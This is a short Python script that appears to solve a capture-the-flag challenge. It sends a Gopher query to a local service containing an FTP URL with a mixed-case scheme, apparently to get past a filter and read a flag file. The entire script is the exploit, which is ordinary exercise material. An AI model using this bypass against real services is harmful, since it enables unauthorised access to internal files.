import pituophis

result = pituophis.get(
    "localhost",
    port=13370,
    path="/search",
    query="ftP://anonymous@localhost/library/flag.txt",
).text()

print(result)
